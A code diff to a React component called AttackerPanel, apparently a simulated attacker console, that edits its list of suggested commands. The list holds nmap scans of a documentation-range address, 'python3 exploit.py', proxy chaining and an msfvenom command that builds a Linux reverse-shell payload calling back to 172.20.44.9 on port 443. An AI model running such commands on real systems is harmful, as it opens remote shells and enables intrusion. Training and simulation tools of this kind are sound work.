@@ -28,15 +28,18 @@ const suggestedCommands = [
   "show ips",
   "show route",
   "show beacon",
-  "nmap demo-target.local",
-  "nmap -sV demo-target.local",
+  "nmap 203.0.113.25",
+  "nmap -sV 203.0.113.25",
   "route use relay",
   "route use direct",
   "build package safe",
   `msfvenom -p linux/x86/shell_reverse_tcp LHOST=172.20.44.9 LPORT=443 -b "\\x00\\x0a\\x0d" -f python`,
+  "cat exploit.py",
+  "python3 exploit.py",
   "send package",
   "beacon start",
   "beacon stop",
+  "Proxy Chains"
 ];
 
 export default function AttackerPanel({
